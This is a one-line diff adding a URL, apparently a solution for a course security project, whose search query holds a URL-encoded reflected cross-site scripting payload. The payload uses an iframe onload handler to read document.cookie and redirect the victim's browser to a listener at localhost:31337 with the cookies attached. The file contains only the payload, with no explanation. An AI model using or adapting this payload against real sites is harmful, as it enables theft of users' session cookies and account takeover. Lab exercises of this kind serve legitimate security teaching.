@@ -1,0 +1,1 @@
+https://csci3403.com/proj3/search?q=%3Ciframe+onload%3D%22alert%28document.URL%29%3Bvar+stolenCookie+%3D+document.cookie%3Bwindow.location.href+%3D+%27http%3A%2F%2Flocalhost%3A31337%2Fstolen%3Fcookies%3D%27+%2B+stolenCookie%3B%22%3E%3C%2Fiframe%3E
